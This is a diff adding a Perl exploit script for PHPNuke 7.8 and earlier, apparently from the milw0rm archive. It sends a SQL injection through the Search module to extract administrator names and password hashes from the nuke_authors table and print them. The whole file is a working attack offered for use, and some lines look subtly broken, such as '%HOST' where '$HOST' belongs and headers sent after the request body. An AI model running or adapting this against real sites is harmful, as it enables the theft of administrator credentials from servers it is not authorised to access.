@@ -1,0 +1,59 @@
+#!/usr/bin/perl -w
+use IO::Socket;
+
+if (@ARGV < 2)
+{
+print "*---------------------------------------*\n";
+print "* EXPLOIT for PHPNuke <=7.8 *\n";
+print "*---------------------------------------*\n\n";
+print " Usage : \n";
+print " PHPNuke[1] HOST /[path_phpnuke] \n\n";
+print " HOST - Host where is phpnuke example: localhost \n\n";
+print " Example :\n\n";
+print " PHPNuke[1] www.victim.com /phpnuke/html/ \n\n";
+exit();
+}
+
+$HOST = $ARGV[0];
+$phpnuke_path = $ARGV[1];
+
+print "\n";
+print "Host : $HOST\n";
+print "phpnuke_path : $phpnuke_path\n";
+print "\n";
+$OK = 0;
+$modules = "modules.php";
+$query = "name=Search&query=s%')/**/UNION/**/SELECT/**/0,pwd,0,aid,0,0,0,0,0,0/**/FROM/**/nuke_authors/*";
+$length = length $query;
+$GET = $phpnuke_path . $modules;
+print "[*] Connecting at victim host [OK]\n";
+$send = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$HOST", PeerPort => "80") || die "[*] Connect [FAILED]\n";
+print "[*] Connected [OK]\n";
+print "[*] Sending exploit [OK]\n\n";
+print $send "POST ".$GET." HTTP/1.0\n";
+print $send "Host: ".%HOST."\n";
+print $send "Referer: http://".%HOST.$phpnuke_path."modules.php?name=Search \r\n";
+print $send "User-Agent: Internet Explorer 6.0 [SR]\n";
+print $send "Content-Type: application/x-www-form-urlencoded\n";
+print $send "Content-Length: ".$length."\n\n";
+print $send $query;
+print $send "Cookie: lang=english\r\n\r\n";
+print $send "Connection: close\n\n";
+
+print "[*] Exploit send [OK]\n";
+print "[*] Wait for reply...[OK]\n";
+while ($answer = <$send>)
+{
+if ($answer =~ /=0"><b>([^:]*)<\/b>/ ) { 
+$OK = 1;
+print "[*] Success [OK]\n";
+print "[*] USER: $1\n";
+}
+if ($answer =~ /=\"0">([^:]*)<\/a>/ ) { 
+$OK = 1;
+print "[*] PASSWORD: $1\n";
+}
+}
+if ($OK == 0) { print "[*] Exploit [FAILED]\n"; }
+
+# milw0rm.com [2005-11-16]
